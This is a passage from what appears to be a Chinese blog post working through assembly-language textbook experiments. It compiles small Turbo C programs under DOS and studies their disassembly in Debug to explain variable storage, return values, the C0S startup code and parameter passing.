c3;</span><br><span class="line">	a1 = <span class="number">0x0fa1</span>; a2 = <span class="number">0x0fa2</span>; a3 = <span class="number">0x0fa3</span>;</span><br><span class="line">	c1 = <span class="number">0xc1</span>; c2 = <span class="number">0xc2</span>; c3 = <span class="number">0xc3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 问题：C语言将全局变量存放在哪里？将局部变量存放在哪里？每个函数开头的“push bp mov bp,sp”有何含义？<br> 程序中main函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>, <span class="built_in">SP</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">SP</span>, <span class="number">6</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01A6], 00A1</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01A8], 00A2</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01AA], 00A3</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">6</span>], 00B1</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">4</span>], 00B2</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">2</span>], 00B3</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">SP</span>, <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">RET</span></span><br></pre></td></tr></table></figure>
<p> 程序中f函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>, <span class="built_in">SP</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">SP</span>, <span class="number">6</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01A6], 0FA1</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01A8], 0FA2</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01AA], 0FA3</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">6</span>], 00C1</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">4</span>], 00C2</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">2</span>], 00C3</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">SP</span>, <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">RET</span></span><br></pre></td></tr></table></figure>
<p> 答案：<br> C语言将全局变量存放在内存中，将局部变量存放在栈中，每个函数开头的push bp以及mov bp,sp是为了保护与还原现场。</p>
</li>
<li><p>分析下面程序的汇编代码，思考相关的问题。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a,b,ab;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> c;</span><br><span class="line">	c = f();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ab=a+b;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 问题：C语言将函数的返回值存放在哪里？<br> 程序中main函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>, <span class="built_in">SP</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">SP</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">CALL</span> 020A</span><br><span class="line"><span class="keyword">MOV</span> [<span class="built_in">BP</span>-<span class="number">2</span>], <span class="built_in">AX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">SP</span>, <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">RET</span></span><br></pre></td></tr></table></figure>
<p> 程序中f函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>, <span class="built_in">SP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>, [01A6]</span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">AX</span>, [01A8]</span><br><span class="line"><span class="keyword">MOV</span> [01AA], <span class="built_in">AX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>, [01AA]</span><br><span class="line"><span class="keyword">JMP</span> 021C</span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">RET</span></span><br></pre></td></tr></table></figure>
<p> 答案：<br> 在该情况下，C语言将返回值存放在通用寄存器AX中。</p>
</li>
<li><p>下面的程序向安全的内存空间写入从“a”到“h”8个字符，理解程序的含义，深入理解相关的知识。（注意：请自己学习、研究malloc函数的用法）</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Buffer ((char *) * (int far *)0x02000000)</span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	Buffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	Buffer[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(Buffer[<span class="number">10</span>]!=<span class="number">8</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Buffer[Buffer[<span class="number">10</span>]]=<span class="string">'a'</span>+Buffer[<span class="number">10</span>];</span><br><span class="line">		Buffer[<span class="number">10</span>]++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 理解：<br> 程序通过malloc分配大小为20字节的空间给并将其地址存入Buffer所指向的空间即0200:0000中。随后，通过一个while循环将这20个字节的空间的0-7个字节分别赋予对应的字符，并且用第10个字节计数。</p>
</li>
</ol>
<h2 id="研究试验4-不用main函数编程"><a href="#研究试验4-不用main函数编程" class="headerlink" title="研究试验4 不用main函数编程"></a>研究试验4 不用main函数编程</h2><ol>
<li><p>把程序F.C保存在C:\MINIC下，对其进行编译，连接，思考相关的问题。<br> 问题：<br> ①编译和连接哪个环节会出问题？<br> ②显示出的错误信息是什么？<br> ③这个错误信息可能和哪个文件有关？<br> 答案：<br> ①连接环节出现了错误<br> ②在C0S模块中未定义的标号_main<br> ③和C0S.OBJ这个文件有关</p>
</li>
<li><p>用学习汇编语言时使用的LINK.EXE对TC.EXE生成的F.OBJ文件进行连接，生成F.EXE。用DEBUG加载F.EXE，察看整个程序的汇编代码。思考相关的问题。<br> 问题：<br> ①F.EXE的程序代码总共有多少字节？<br> ②F.EXE的程序能正确返回吗？<br> ③F函数的偏移地址是多少？<br> 答案：<br> ①F.EXE的程序代码总共有1DH个字节<br> ②F.EXE的程序不能正确的返回<br> ③F函数的偏移地址为0</p>
</li>
<li><p>写一个程序M.C。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main ()</span><br><span class="line">&#123;</span><br><span class="line">	*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">80</span>)=<span class="string">'a'</span>;</span><br><span class="line">	*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">81</span>)=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 用TC.EXE对M.C进行编译，连接，生成M.EXE，用Debug察看M.EXE整个程序的汇编代码。思考相关的问题。<br> 问题：<br> (1)M.EXE的程序代码总共有多少字节？<br> (2)M.EXE的程序能正确返回吗？<br> (3)M.EXE程序中的main函数和F.EXE中的f函数的汇编代码有何不同？<br> 答案：<br> (1)M.EXE的程序代码总共有5F5H个字节<br> (2)M.EXE的程序能正确返回<br> (3)M.EXE程序中的main函数和F.EXE中的f函数的汇编代码没有不同</p>
</li>
<li><p>用Debug对m.exe进行跟踪：<br> (1)找到对main函数进行调用的指令的地址<br> (2)找到整个程序返回的指令<br> 注意：使用g命令和p命令。<br> 答案：<br> (1)对main函数进行调用的指令的地址为076A:011A CALL 01FA<br> (2)整个程序返回的指令为076A:0156 INT 21</p>
</li>
<li><p>思考如下几个问题：<br> (1)对main函数调用的指令和程序返回的指令是哪里来的？<br> (2)没有main函数时，出现的错误信息里有和“C0S”相关的信息；而前面在搭建开发环境时，没有C0S.OBJ文件TC.EXE就无法对程序进行连接。是不是TC.EXE把C0S.OBJ和用户程序的.OBJ一起进行连接生成.EXE文件？<br> (3)对用户程序的main函数进行调用的指令和程序返回的指令是否就来自C0S.OBJ文件？<br> (4)我们如何看到C0S.OBJ文件中的程序代码呢？<br> (5)C0S.OBJ文件里有我们设想的代码吗？<br> 回答：<br> (1)对main函数调用的指令和程序返回的指令是来自于其他的文件而非编译后的文件。<br> (2)是的<br> (3)是的<br> (4)用LINK.EXE对其进行连接即可<br> (5)有</p>
</li>
<li><p>用LINK.EXE对C:\MINIC目录下的C0S.OBJ进行连接，生成C0S.EXE。<br> 用Debug分别察看C0S.EXE和M.EXE的汇编代码。注意：从头开始察看，两个文件中的程序代码有和相同之处？<br> 两个程序的代码基本相同，且都是在011A调用了CALL指令，在0156调用了INT 21中断</p>
</li>
<li><p>用Debug找到M.EXE中调用main函数的CALL指令的偏移地址，从这个偏移地址开始向后察看10条指令；然后用Debug加载C0S.EXE，从相同的偏移地址开始向后察看10条指令，对两处的指令进行对比。<br> M.EXE和C0S.EXE在偏移地址011A之后的10条指令除了跳转指令的跳转地址有所不同外几乎完全相同。</p>
</li>
<li><p>下面，我们用汇编语言编一个程序C0S.ASM，然后把它编译为C0S.OBJ，替代C:\MINIC目录下的C0S.OBJ。<br> 程序C0S.ASM：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line">	<span class="built_in">db</span> <span class="number">128</span> dup (<span class="number">0</span>)</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line">		<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line">		<span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line">		<span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">108</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">call</span> s</span><br><span class="line"></span><br><span class="line">		<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line">		<span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">s:</span>		</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
</li>
<li><p>在C:\MINIC目录下，用TC.EXE将F.C重新进行编译，连接，生成F.EXE。这次能通过连接吗？F.EXE可以正确运行吗？用Debug察看F.EXE的汇编代码。<br> 能通过连接，可以正确运行，汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,076A</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">DS</span>,<span class="built_in">AX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">SS</span>,<span class="built_in">AX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">SP</span>,<span class="number">0080</span></span><br><span class="line"><span class="keyword">CALL</span> <span class="number">0012</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,4C00</span><br><span class="line"><span class="keyword">INT</span> <span class="number">21</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,B800</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0690</span></span><br><span class="line"><span class="symbol">ES:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>],<span class="number">61</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,B800</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0691</span></span><br><span class="line"><span class="symbol">ES:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>],<span class="number">02</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">RET</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>在新的C0S.OBJ的基础上，写一个新的F.C，向安全的内存空间写入从“a”到“h”的8个字符，分析、理解F.C。<br>程序F.C：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Buffer ((char *) * (int far *)0x02000000)</span></span><br><span class="line"></span><br><span class="line">f()</span><br><span class="line">&#123;</span><br><span class="line">	Buffer = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	Buffer[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(Buffer[<span class="number">10</span>]!=<span class="number">8</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Buffer[Buffer[<span class="number">10</span>]]=<span class="string">'a'</span>+Buffer[<span class="number">10</span>];</span><br><span class="line">		Buffer[<span class="number">10</span>]++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>汇编代码如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,076A</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">DS</span>,<span class="built_in">AX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">SS</span>,<span class="built_in">AX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">SP</span>,<span class="number">0080</span></span><br><span class="line"><span class="keyword">CALL</span> <span class="number">0012</span> <span class="comment">;调用f函数</span></span><br><span class="line"><span class="keyword">INT</span> <span class="number">21</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span> <span class="comment">;0012</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="symbol">ES:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>],<span class="number">0000</span> <span class="comment">;设置Buffer=0，即将0200:0000处的内存单元改为0</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="symbol">ES:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>] <span class="comment">;将Buffer解引用，即将0200:0000处的内存字单元存入BX中</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>+0A],<span class="number">00</span> <span class="comment">;设置Buffer[10]=0 即将DS:000A处的内存单元改为0</span></span><br><span class="line"><span class="keyword">JMP</span> <span class="number">006D</span> <span class="comment">;while 循环条件判断</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span> <span class="comment">;0031</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="symbol">ES:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>] <span class="comment">;将Buffer解引用，即将0200:0000处的内存字单元存入BX中</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AL</span>,[<span class="built_in">BX</span>+0A] <span class="comment">;AL等于Buffer[10]，即将DS:000A内存字节单元的内容存入AL中</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">AL</span>,<span class="number">61</span> <span class="comment">;为AL加上'a'</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="symbol">ES:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>] <span class="comment">;将Buffer解引用，即将0200:0000处的内存字单元存入BX中</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">AX</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">BX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="symbol">ES:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>] <span class="comment">;将Buffer解引用，即将0200:0000处的内存字单元存入BX中</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AL</span>,[<span class="built_in">BX</span>+0A] <span class="comment">;将Buffer[10]的值传入AL，即将DS:000A处的内存字节单元存入AL中</span></span><br><span class="line"><span class="keyword">CBW</span> <span class="comment">;将AL扩展至16位</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">BX</span> <span class="comment">;取回BX</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">BX</span>,<span class="built_in">AX</span> <span class="comment">;BX现在值为Buffer[10]</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">AX</span> <span class="comment">;取回AX</span></span><br><span class="line"><span class="keyword">MOV</span> [<span class="built_in">BX</span>],<span class="built_in">AL</span> <span class="comment">;将所要设置的数值'a'+Buffer[10]存入Buffer[Buffer[10]]中</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="symbol">ES:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>] <span class="comment">;将Buffer解引用，即将0200:0000处的内存字单元存入BX中</span></span><br><span class="line"><span class="keyword">INC</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>+0A] <span class="comment">;将Buffer[10]自增</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span> <span class="comment">;006D</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="symbol">ES:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>]</span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>+0A],<span class="number">08</span> <span class="comment">;判断Buffer[10]是否等于8</span></span><br><span class="line"><span class="keyword">JNZ</span> <span class="number">0031</span> <span class="comment">;不等于则继续</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">BP</span> <span class="comment">;等于则返回</span></span><br><span class="line"><span class="keyword">RET</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="研究试验5-函数如何接受不定数量的参数"><a href="#研究试验5-函数如何接受不定数量的参数" class="headerlink" title="研究试验5 函数如何接受不定数量的参数"></a>研究试验5 函数如何接受不定数量的参数</h2><p>用C:\MINIC下的TC.EXE完成下面的试验。</p>
<ol>
<li><p>写一个程序A.C：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showchar</span><span class="params">(<span class="keyword">char</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	showchar(<span class="string">'a'</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showchar</span><span class="params">(<span class="keyword">char</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">80</span>)=a;</span><br><span class="line"></span><br><span class="line">	*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">81</span>)=b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 用TC.EXE对A.C进行编译，连接，生成A.EXE。用Debug加载A.EXE，对函数的汇编代码进行分析。解答这两个问题：main函数是如何给showchar传递参数的？showchar是如何接受参数的？<br> main函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,<span class="number">0002</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">AX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AL</span>,<span class="number">61</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">AX</span></span><br><span class="line"><span class="keyword">CALL</span> 020B <span class="comment">;调用showchar函数</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">CX</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">CX</span></span><br><span class="line"><span class="keyword">POP</span> <span 